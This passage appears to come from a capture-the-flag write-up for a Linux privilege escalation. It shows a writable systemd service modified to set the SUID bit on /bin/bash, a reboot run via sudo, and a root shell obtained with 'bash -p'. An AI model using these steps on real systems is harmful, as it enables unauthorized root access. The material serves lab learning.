Using information gathered from linpeas, the service `/etc/systemd/system/zeno-monitoring.service` is writeable
```
[Unit]
Description=Zeno monitoring

[Service]
RemainAfterExit=yes
Type=simple
User=root
ExecStart=/root/zeno-monitoring.py

[Install]
WantedBy=default.target
```

Modified the script to run `ExecStart=/var/tmp/zeno-monitoring.py` to get a reverse shell but that didn't work. Tried other methods to execute a bash command to get a reverse shell but that didn't work either
```
[Unit]
Description=Zeno monitoring

[Service]
RemainAfterExit=yes
Type=simple
User=root
ExecStart=/usr/bin/chmod +s /bin/bash

[Install]
WantedBy=default.target
```

Logged in as user `edward` with gathered credentials, and ran `sudo -l`
- The user is allowed to run `sudo /usr/bin/reboot`
This should restart the service and set SUID bit on `/bin/bash` . Once restarted, logged in as `edward` again
```bash
/bin/bash -p
```